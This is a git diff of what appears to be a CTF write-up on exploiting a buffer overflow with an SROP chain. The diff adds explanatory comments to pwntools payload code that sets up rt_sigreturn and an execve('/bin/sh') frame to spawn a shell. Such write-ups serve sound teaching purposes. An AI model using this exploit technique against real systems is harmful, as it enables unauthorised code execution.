@@ -33,23 +33,25 @@ That's the whole binary, we see there is a huge buffer overflow that `rdx` reads
 
 Now that we have this, we can craft the `SROP` chain.
 We want to execute system("/bin/sh") but in assembly language it is execve("/bin/sh", argument, env ) function.
+![image](https://github.com/user-attachments/assets/b9f3ec88-7915-49f1-88b1-25aac79cd63e)
+
 ```python
 # Srop
 POP_RAX =0x0043018
 SYSCALL_RET=0x043015
-BINSH = elf.address + 0x1238
+BINSH = 0x43238
 ```
 
 After crafting the `frame`, we send the payload to trigger the vulnerability and get shell.
 
 ```python
-payload = b'a'*0x8
+payload = b'a'*0x8  # 8 bytes override for save rbp
 payload += p64(POP_RAX)
-payload += p64(0xf)
+payload += p64(0xf)  # syscall number for rt_sigreturn(), search for linux syscall table
 payload += p64(SYSCALL_RET)
 
 frame = SigreturnFrame()
-frame.rax = 0x3b           
+frame.rax = 0x3b           # syscall number for execve() function, u can search linux syscall table
 frame.rdi = BINSH          
 frame.rsi = 0x0             
 frame.rdx = 0x0 
